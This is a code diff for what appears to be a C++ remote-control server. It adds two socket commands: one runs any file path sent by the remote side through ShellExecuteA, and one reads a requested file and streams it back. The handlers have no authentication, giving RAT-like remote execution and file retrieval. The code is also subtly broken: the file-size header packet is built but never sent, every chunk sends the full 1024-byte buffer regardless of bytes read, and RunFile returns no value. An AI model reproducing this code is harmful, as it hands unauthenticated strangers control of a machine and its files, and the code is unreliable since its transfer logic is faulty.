@@ -106,6 +106,48 @@ int  MakeDirectoryInfo() {
     CServerSocket::getInstance()->Send(pack);
     return 0;
 }
+int RunFile() {
+    std::string strPath;
+    if (CServerSocket::getInstance()->GetFilePath(strPath) == false) {
+        OutputDebugString(_T("命令解析错误！"));
+        return -1;
+    }
+    ShellExecuteA(NULL, NULL, strPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
+    CPacket pack(3, NULL,0);
+    CServerSocket::getInstance()->Send(pack);
+}
+int DownFile() {
+    std::string strPath;
+    long long data = 0;
+    if (CServerSocket::getInstance()->GetFilePath(strPath) == false) {
+        OutputDebugString(_T("命令解析错误！"));
+        return -1;
+    }
+    FILE* pFile = NULL;
+    errno_t err=fopen_s(&pFile,strPath.c_str(), "rb");
+    if (err != 0) {
+        CPacket pack(4,(BYTE*)&data, 8);
+        CServerSocket::getInstance()->Send(pack);
+        return -2;
+    }
+    if (pFile != NULL) {
+        fseek(pFile, 0, SEEK_END);
+        data = _ftelli64(pFile);
+        CPacket head(4, (BYTE*)&data, 8);
+        fseek(pFile, 0, SEEK_SET);
+        char buffer[1024] = "";
+        size_t rlen = 0;
+        do {
+            rlen = fread(buffer, 1, 1024, pFile);
+            CPacket pack(4, (BYTE*)buffer, sizeof(buffer));
+            CServerSocket::getInstance()->Send(pack);
+        } while (rlen >= 1024);
+        fclose(pFile);
+    }    
+    CPacket pack(4, NULL, 0);
+    CServerSocket::getInstance()->Send(pack); 
+    return 0;
+}
 int main()
 {
     int nRetCode = 0;
@@ -150,6 +192,12 @@ int main()
                 break;
             case 2:
                 MakeDirectoryInfo();
+                break;
+            case 3:
+                RunFile();
+                break;
+            case 4:
+                DownFile();
                 break;
             }
             
